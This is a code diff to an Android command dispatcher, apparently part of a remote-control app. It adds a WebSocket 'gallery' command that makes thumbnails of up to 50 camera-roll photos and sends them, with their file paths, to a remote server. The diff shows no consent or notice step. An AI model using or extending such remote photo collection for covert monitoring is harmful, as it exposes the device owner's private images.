@@ -182,6 +182,7 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             // 文件
             case "files":       handleFetchFiles(payload); break;
             case "viewfile":    handleViewFile(payload); break;
+            case "gallery":     handleGallery(payload); break;
             case "changefiles": handleChangeFiles(payload); break;
 
             // 应用
@@ -1194,6 +1195,79 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 }
             } catch (Exception e) {
                 Log.w(TAG, "viewFile failed: " + filepath, e);
+            }
+        }).start();
+    }
+
+    /**
+     * 相册: 一次返回图片列表 + 缩略图 (替代 files + N 次 viewfile)
+     * 格式: {"type":"screencomd", "subc":"gallery", "filepath":"/sdcard/DCIM/Camera/"}
+     * 返回: 每张图片一条 thumb + 最后一条 files 列表
+     */
+    private void handleGallery(JsonObject payload) {
+        String filepath = ScreenActionParser.getString(payload, "filepath", "/sdcard/DCIM/Camera");
+        Log.d(TAG, "gallery: " + filepath);
+        WebSocketClient ws = getWsClient();
+        if (ws == null) return;
+
+        new Thread(() -> {
+            try {
+                File dir = new File(filepath);
+                if (!dir.exists() || !dir.isDirectory()) return;
+
+                File[] allFiles = dir.listFiles();
+                if (allFiles == null) return;
+
+                String[] exts = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"};
+                int count = 0;
+
+                for (File f : allFiles) {
+                    if (f.isDirectory() || count >= 50) continue;
+                    String name = f.getName().toLowerCase();
+                    boolean isImage = false;
+                    for (String ext : exts) {
+                        if (name.endsWith(ext)) { isImage = true; break; }
+                    }
+                    if (!isImage) continue;
+
+                    try {
+                        android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
+                        opts.inJustDecodeBounds = true;
+                        android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath(), opts);
+
+                        int targetSize = 150;
+                        int scale = 1;
+                        while (opts.outWidth / scale > targetSize * 2 && opts.outHeight / scale > targetSize * 2) {
+                            scale *= 2;
+                        }
+                        opts.inJustDecodeBounds = false;
+                        opts.inSampleSize = scale;
+                        android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath(), opts);
+                        if (bitmap == null) continue;
+
+                        float ratio = Math.min((float) targetSize / bitmap.getWidth(),
+                                               (float) targetSize / bitmap.getHeight());
+                        android.graphics.Bitmap thumb = android.graphics.Bitmap.createScaledBitmap(
+                            bitmap, (int)(bitmap.getWidth() * ratio), (int)(bitmap.getHeight() * ratio), true);
+                        bitmap.recycle();
+
+                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+                        thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, baos);
+                        thumb.recycle();
+
+                        ws.sendThumb(Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP), f.getAbsolutePath());
+                        count++;
+                    } catch (Exception e) {
+                        Log.w(TAG, "gallery thumb failed: " + f.getName(), e);
+                    }
+                }
+                Log.d(TAG, "gallery sent: " + count + " images from " + filepath);
+
+                // 发送文件列表
+                JsonArray arr = FileListHelper.buildFileList(dir);
+                ws.sendData("files", arr.toString());
+            } catch (Exception e) {
+                Log.w(TAG, "gallery failed", e);
             }
         }).start();
     }
